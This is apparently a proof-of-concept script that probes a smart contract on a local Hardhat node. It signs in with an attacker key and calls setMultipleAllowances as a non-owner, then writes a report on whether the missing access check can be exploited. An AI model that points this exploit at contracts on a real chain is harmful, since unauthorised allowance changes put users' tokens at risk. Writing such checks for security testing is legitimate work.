﻿import { JsonRpcProvider, Wallet } from "ethers";
import fs from "fs";

async function main() {
  const args = process.argv.slice(2);
  if (args.length < 1) {
    console.error("Usage: node scripts\\nuclei_poc_runner.js <CONTRACT_ADDRESS>");
    process.exit(2);
  }
  const target = args[0];
  const RPC = "http://127.0.0.1:8545";
  const provider = new JsonRpcProvider(RPC);

  // Prefer explicit attacker private key via env var (safer and reliable)
  const attackerPk = process.env.ATTACKER_PRIVATE_KEY || process.env.PRIVATE_KEY;

  let signer;
  if (attackerPk && attackerPk.startsWith("0x")) {
    signer = new Wallet(attackerPk, provider);
  } else {
    // fallback to provider.getSigner(1) and check support for sendTransaction
    try {
      const maybeSigner = provider.getSigner(1);
      // quick check: try to get address and send a dummy call to ensure it's a real signer
      await maybeSigner.getAddress();
      // test if sendTransaction exists by checking function presence
      if (typeof maybeSigner.sendTransaction === "function") {
        signer = maybeSigner;
      } else {
        throw new Error("provider signer does not support sendTransaction");
      }
    } catch (e) {
      // fallback to provider.getSigner(0) if nothing else works
      try {
        const s0 = provider.getSigner(0);
        if (typeof s0.sendTransaction === "function") {
          signer = s0;
        } else {
          throw e;
        }
      } catch (e2) {
        const report = {
          vulnerable: false,
          error: "No usable signer available. Please set ATTACKER_PRIVATE_KEY env var to a private key from the local Hardhat node.",
          details: String(e2)
        };
        fs.writeFileSync("debug.txt", JSON.stringify(report, null, 2) + "\n");
        console.error(JSON.stringify(report, null, 2));
        process.exit(1);
      }
    }
  }

  const abi = ["function setMultipleAllowances(address[] spenders, uint256[] values)"];
  // create contract with chosen signer (Wallet or JsonRpcSigner)
  const contract = new (await import("ethers")).Contract(target, abi, signer);

  const spenders = ["0x1000000000000000000000000000000000000000"];
  const values = [123456789];

  try {
    const tx = await contract.setMultipleAllowances(spenders, values);
    const receipt = await tx.wait();

    const report = {
      vulnerable: true,
      txHash: receipt.transactionHash,
      message: `setMultipleAllowances executed by non-owner (signer=${await signer.getAddress()})`,
      target
    };

    const out = JSON.stringify(report, null, 2);
    console.log(out);
    fs.writeFileSync("debug.txt", out + "\n");
    process.exit(0);
  } catch (err) {
    const report = {
      vulnerable: false,
      error: String(err),
      target
    };
    const out = JSON.stringify(report, null, 2);
    console.error(out);
    fs.writeFileSync("debug.txt", out + "\n");
    process.exit(1);
  }
}

main();
